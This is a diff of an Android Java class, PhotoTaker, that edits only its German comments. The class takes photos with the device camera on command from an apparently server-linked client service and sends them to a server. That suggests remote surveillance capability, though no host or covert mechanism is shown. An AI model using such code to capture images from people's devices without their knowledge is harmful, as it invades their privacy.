@@ -14,16 +14,15 @@ import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 
 /**
- * Mit dieser Klasse sollten eigentlich Fotos erstellt werden und diese an den Server gesendet werden.
- * Allerdings scheint das erstellen des Fotos nicht zu funktionieren.
+ * Mit dieser Klasse werden Fotos erstellt und an den Server gesendet.
  */
 public class PhotoTaker {
 	/**
-	 * cam Der Manager für den Kamera
+	 * cam Das Kameraobjekt
 	 */
 	Camera cam;
 	/**
-	 * ctx Der Service der das Objekt erstell oder die Methode aufruft.
+	 * ctx Der Service, welcher das Objekt erstellt oder die Methode aufruft.
 	 */
 	ClientListener ctx;
 	/**
@@ -31,11 +30,11 @@ public class PhotoTaker {
 	 */
 	int chan ;
 	/**
-	 * Ein Interface mit dem man die Größe und das Format eine Surface bestimmen kann. Außerdem können hiermit Pixel auf dieser Flächer verändet werden.
+	 * Ein Interface mit dem man die Größe und das Format eine Surface bestimmen kann.
 	 */
 	SurfaceHolder holder;
 	/**
-	 * pic Ein Interface um Bilddaten eines Fotoschuss zu erhalten.
+	 * pic Ein Interface um Bilddaten eines Fotos zu erhalten. Diese Methode wird aufgerufen wenn die Bilddaten nach dem Aufnehmen eines Fotos von der Kamera zur Verfügung gestellt werden.
 	 */
 	private PictureCallback pic = new PictureCallback() {
 		/**
@@ -75,7 +74,7 @@ public class PhotoTaker {
 	*/
 
 	/**
-	 * Zum Erstellen von Fotos.
+	 * Methode zum Erstellen von Fotos.
 	 * @return True falls das Foto aufgenommen wurde, falls sonst.
 	 */
 	public boolean takePhoto(byte[] args) {
@@ -117,7 +116,7 @@ public class PhotoTaker {
         
         Log.i("PhotoTaker", "Right after Open !");
 		/**
-		 * Sollte man keine Zugriff auf die Kamerahardware erhalten so wird false returned.
+		 * Sollte man keine Zugriff auf die Kamerahardware erhalten, wird false returned.
 		 */
         if (cam == null)
         	return false;
@@ -126,12 +125,12 @@ public class PhotoTaker {
         try {
         	holder = view.getHolder();
 			/**
-			 * Hiermit soll ein LivePreview ermöglicht werden. Diese wird auf der Surface dargestellt.
+			 * Hiermit soll ein LivePreview ermöglicht werden. Diese Preview wird auf der Surface dargestellt.
 			 */
         	cam.setPreviewDisplay(holder);
         } catch(IOException e) { return false; }
 		/**
-		 * Erstellen des Fotos und die Preview wird auf dem Screen angezeigt.
+		 * Straten der Preview.
 		 */
         cam.startPreview();
 		/**
@@ -139,7 +138,7 @@ public class PhotoTaker {
 		 */
         cam.takePicture(null, null, pic);
 		/**
-		 * Sollte man hierangekommen sein hat man erfolgreich ein Foto erstellt. Daher wir true zurückgeliefert.
+		 * Hier wurde das Bild erfolgreich erstellt. Daher wir true zurückgeliefert.
 		 */
         return true;
 	}
